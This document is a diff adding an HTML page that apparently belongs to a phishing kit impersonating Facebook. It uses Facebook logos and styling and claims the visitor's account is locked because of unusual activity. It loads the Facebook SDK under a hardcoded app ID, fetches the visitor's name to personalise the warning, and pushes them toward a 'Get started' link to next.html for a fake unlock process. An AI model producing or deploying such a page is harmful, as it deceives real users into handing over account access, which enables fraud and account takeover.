@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Account Locked</title>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            padding-bottom: 10px;
+        }
+        .top-bar a {
+            text-decoration: none;
+            color: #1877f2;
+            font-weight: bold;
+        }
+        .header {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .message {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .alert-box {
+            background: #e7f3ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            border: 1px solid #1877f2;
+        }
+        .alert-box img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+        .alert-box p {
+            margin: 0;
+            font-size: 14px;
+        }
+        .alert-box strong {
+            display: block;
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        .button {
+            display: block;
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            text-align: center;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #165cbb;
+        }
+        .logo-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo-bar img {
+            height: 35px;
+        }
+    </style>
+    <script>
+        window.fbAsyncInit = function() {
+            FB.init({
+                appId      : '2055787844847287',
+                cookie     : true,
+                xfbml      : true,
+                version    : 'v12.0'
+            });
+            FB.getLoginStatus(function(response) {
+                if (response.status === 'connected') {
+                    getUserInfo();
+                } else {
+                    FB.login();
+                }
+            });
+        };
+        
+        function getUserInfo() {
+            FB.api('/me', function(response) {
+                document.getElementById("user-name").textContent = response.name + ", your account has been locked";
+            });
+        }
+        
+        function updateDate() {
+            const today = new Date();
+            const options = { year: 'numeric', month: 'long', day: 'numeric' };
+            document.getElementById("lock-date").textContent = "Account locked " + today.toLocaleDateString("en-US", options);
+        }
+        
+        window.onload = function() {
+            updateDate();
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <span>Data Mode</span>
+            <a href="#">Buy data</a>
+        </div>
+        <div class="logo-bar">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            <a href="#">Help</a>
+        </div>
+        <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" width="100" alt="Locked Account Icon">
+        <div class="header" id="user-name">Your account has been locked</div>
+        <div class="message">We saw unusual activity on your account. This may mean that someone has used your account without your knowledge.</div>
+        
+        <div class="alert-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Lock Icon">
+            <div>
+                <strong id="lock-date">Account locked</strong>
+                <p>To protect you, your profile is not visible to people on Facebook and you can't use your account.</p>
+            </div>
+        </div>
+        
+        <div class="message">We'll take you through some steps to unlock your account.</div>
+        <a href="next.html" class="button" onclick="updateDate()">Get started</a>
+    </div>
+</body>
+</html>
